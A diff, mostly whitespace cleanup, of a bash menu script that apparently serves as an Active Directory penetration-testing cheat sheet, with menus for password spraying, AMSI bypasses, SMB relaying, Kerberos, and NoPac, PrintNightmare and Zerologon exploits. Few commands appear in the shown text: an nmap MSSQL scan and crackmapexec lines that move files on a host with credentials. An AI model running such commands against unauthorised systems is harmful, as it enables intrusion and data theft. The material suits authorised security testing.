 echo -ne  "Return to Previous Menu?
 
-    
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -2254,13 +2274,13 @@ echo -ne  "Return to Previous Menu?
 		0) exit 0 ;;
 		*) Internal_Menu_Password_Spraying;;
         esac
-        
+
 }
 
 Internal_Menu_AMSI_Bypasses(){
 
     clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -2293,7 +2313,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-    
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -2310,7 +2330,7 @@ echo -ne  "Return to Previous Menu?
 Internal_Menu_CVEs(){
 
     clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -2320,7 +2340,7 @@ echo -ne " What would you like to do?
 
 
 	1)  ->  [ NoPac ${LYELLOW}WIP${RESTORE}	]
-	
+
 	Q)  ->	[Previous Menu	]
 
 "
@@ -2337,12 +2357,12 @@ echo -ne " What would you like to do?
 Internal_Menu_CVEs_NoPac_Exploit(){
 
     clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
 echo -e "${LGREEN}NoPac (Exploit)${RESTORE}"
-echo -e 
+echo -e
 echo -e "${IBLUE}Invoke-NoPac${RESTORE}"
 echo -e ""
 echo -e "${YELLOW}Load into Memory${RESTORE}"
@@ -2360,7 +2380,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-    
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -2395,7 +2415,7 @@ echo -ne " What would you like to do?
 	11) -> 	[ RDP		]
 	12) ->	[ SMB		]
 	13) ->	[ WinRM		]
-	
+
 	Q)  -> 	[ Options	]
         E)  -> 	[ Recent CVE's	]
 "
@@ -2426,7 +2446,7 @@ echo -ne " What would you like to do?
 External_Menu_BloodHound(){
 
     clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -2444,7 +2464,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-    
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -2462,7 +2482,7 @@ echo -ne  "Return to Previous Menu?
 External_Menu_DNS(){
 
     clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -2494,7 +2514,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-    
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -2510,7 +2530,7 @@ echo -ne  "Return to Previous Menu?
 External_Menu_Impacket(){
 
     clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -2545,7 +2565,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-    
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -2555,14 +2575,14 @@ echo -ne  "Return to Previous Menu?
 		0) exit 0 ;;
 		*) External_Menu_Impacket;;
         esac
-           
+
 }
 
 
 External_Menu_Kerberos(){
 
     clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -2586,7 +2606,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-    
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -2596,14 +2616,14 @@ echo -ne  "Return to Previous Menu?
 		0) exit 0 ;;
 		*) External_Menu_Kerberos;;
         esac
-        
+
 }
 
 
 External_Menu_LDAP(){
 
     clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -2638,7 +2658,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-    
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -2648,7 +2668,7 @@ echo -ne  "Return to Previous Menu?
 		0) exit 0 ;;
 		*) External_Menu_LDAP;;
         esac
-        
+
 }
 
 
@@ -2663,10 +2683,10 @@ echo -ne " What would you like to do?
 
 
 	1)  ->  [ SMB Relaying	]
-	
+
 	Q)  ->	[ Previous Menu	]
 
-        
+
 "
         read a
         case $a in
@@ -2675,7 +2695,7 @@ echo -ne " What would you like to do?
 		0) exit 0 ;;
 		*) External_Menu_MiTM;;
         esac
-        
+
 }
 
 
@@ -2714,7 +2734,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-    
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -2733,7 +2753,7 @@ echo -ne  "Return to Previous Menu?
 External_Menu_MSSQL(){
 
     clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -2741,7 +2761,7 @@ echo -e "${LGREEN}MSSQL${RESTORE}"
 echo -e ""
 echo -e "${IBLUE}Nmap${RESTORE}"
 echo -e "sudo nmap -Pn -p 1433 --script=ms-sql-info.nse $IP"
-echo -e 
+echo -e
 echo -e "${IBLUE}Crackmapexec${RESTORE}"
 echo -e "crackmapexec mssql $IP -u $Username -p $Password -d $Domain --share <share_name> --get-file <remote_filename> <output_filename>"
 echo -e "crackmapexec mssql $IP -u $Username -p $Password -d $Domain --share <share_name> --put-file <remote_filename> <output_filename>"
@@ -2771,7 +2791,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-    
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -2781,14 +2801,14 @@ echo -ne  "Return to Previous Menu?
 		0) exit 0 ;;
 		*) External_Menu_MSSQL;;
         esac
-        
+
 }
 
 
 External_Menu_NTP(){
 
     clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -2804,7 +2824,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-    
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -2821,7 +2841,7 @@ echo -ne  "Return to Previous Menu?
 External_Menu_Nmap(){
 
     clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -2845,7 +2865,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-    
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -2855,14 +2875,14 @@ echo -ne  "Return to Previous Menu?
 		0) exit 0 ;;
 		*) External_Menu_Nmap;;
         esac
-        
+
 }
 
 
 External_Menu_Pyerview(){
 
     clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -2892,7 +2912,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-    
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -2902,14 +2922,14 @@ echo -ne  "Return to Previous Menu?
 		0) exit 0 ;;
 		*) External_Menu_Pyerview;;
         esac
-        
+
 }
 
 
 External_Menu_RDP(){
 
     clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -2934,7 +2954,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-    
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -2944,14 +2964,14 @@ echo -ne  "Return to Previous Menu?
 		0) exit 0 ;;
 		*) External_Menu_RDP;;
         esac
-        
+
 }
 
 
 External_Menu_SMB(){
 
     clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -3025,7 +3045,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-    
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -3035,14 +3055,14 @@ echo -ne  "Return to Previous Menu?
 		0) exit 0 ;;
 		*) External_Menu_SMB;;
         esac
-        
+
 }
 
 
 External_Menu_WinRM(){
 
     clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -3059,7 +3079,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-    
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -3069,13 +3089,13 @@ echo -ne  "Return to Previous Menu?
 		0) exit 0 ;;
 		*) External_Menu_WinRM;;
         esac
-        
+
 }
 
 External_Menu_CVEs(){
 
     clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -3087,7 +3107,7 @@ echo -ne " What would you like to do?
 	1)  ->  [ NoPac		  ]  ${LYELLOW}WIP${RESTORE}
 	2)  -> 	[ Print Nightmare ]  ${LYELLOW}WIP${RESTORE}
 	3)  ->	[ Zerologon	  ]  ${LYELLOW}WIP${RESTORE}
-	
+
 	Q)  ->	[Previous Menu	  ]
 
 "
@@ -3106,7 +3126,7 @@ echo -ne " What would you like to do?
 External_Menu_CVEs_NoPac(){
 
     clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -3117,7 +3137,7 @@ echo -ne " What would you like to do?
 
 	1)  ->  [ Check    	]
 	2)  ->	[ Exploit  	]
-	
+
 	Q)  ->	[Previous Menu	]
 
 "
@@ -3129,13 +3149,13 @@ echo -ne " What would you like to do?
 		0) exit 0 ;;
 		*) External_Menu_CVEs_NoPac;;
         esac
-        
+
 }
 
 External_Menu_CVEs_NoPac_Check(){
 
     clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -3150,7 +3170,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-    
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -3166,7 +3186,7 @@ echo -ne  "Return to Previous Menu?
 External_Menu_CVEs_NoPac_Exploit(){
 
     clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -3185,7 +3205,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-    
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -3201,7 +3221,7 @@ echo -ne  "Return to Previous Menu?
 External_Menu_CVEs_PrintNightmare(){
 
     clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -3212,7 +3232,7 @@ echo -ne " What would you like to do?
 
 	1)  ->  [ Check    	]
 	2)  ->	[ Exploit  	]
-	
+
 	Q)  ->	[Previous Menu	]
 
 "
@@ -3231,7 +3251,7 @@ echo -ne " What would you like to do?
 External_Menu_CVEs_PrintNightmare_Check(){
 
     clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -3251,7 +3271,7 @@ echo -e ""
 echo -e ""
 echo -ne  "Return to Previous Menu?
 
-    
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -3268,7 +3288,7 @@ echo -ne  "Return to Previous Menu?
 External_Menu_CVEs_PrintNightmare_Exploit(){
 
     clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -3307,7 +3327,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-    
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -3324,7 +3344,7 @@ echo -ne  "Return to Previous Menu?
 External_Menu_CVEs_Zerologon(){
 
     clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -3335,7 +3355,7 @@ echo -ne " What would you like to do?
 
 	1)  ->  [ Check    	]
 	2)  ->	[ Exploit  	]
-	
+
 	Q)  ->	[Previous Menu	]
 
 "
@@ -3353,7 +3373,7 @@ echo -ne " What would you like to do?
 External_Menu_CVEs_Zerologon_Check(){
 
     clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -3368,7 +3388,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-    
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -3385,7 +3405,7 @@ echo -ne  "Return to Previous Menu?
 External_Menu_CVEs_Zerologon_Exploit(){
 
     clear
-    
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -3404,7 +3424,7 @@ echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
-    
+
         Q)  ->	[Previous Menu		    ]
 "
 
@@ -3420,7 +3440,7 @@ echo -ne  "Return to Previous Menu?
 External_Variables_Required(){
 
 	clear
-	
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -3473,7 +3493,7 @@ Declare_Variables
 
 echo -ne "
             Choose Option
-            
+
        	1) -> External Commands
        	2) -> Set optional variables
 
@@ -3493,7 +3513,7 @@ echo -ne "
 External_Variables_Optional(){
 
 	clear
-	
+
 echo -e ""
 echo -e ""
 echo -e ""
@@ -3529,7 +3549,7 @@ Declare_Variables_Optional
 
 echo -ne "
             Choose Option
-            
+
        	1) -> External Commands
        	2) -> Set Required Variables
 
@@ -3549,13 +3569,13 @@ echo -ne "
 External_Menu_Options(){
 
 	clear
-	
+
 echo -e ""
 echo -e ""
 echo -e ""
 
 echo -ne "
-	
+
 	What would you like to do?
 
         1) -> Continue to external commands
@@ -3566,7 +3586,7 @@ echo -ne "
         case $a in
 	        1) 	External_Menu_Main ;;
 	        2) 	External_Variables_Required ;;
-	        3)	External_Variables_Optional ;;	
+	        3)	External_Variables_Optional ;;
 		0) exit 0 ;;
 		*) External_Menu_Options;;
         esac
@@ -3611,7 +3631,7 @@ echo -ne "
 
         1) -> Internal (Windows Commands)
         2) -> External (Linux Commands)
-        
+
         3) -> Colour Profiles
 "
         read a
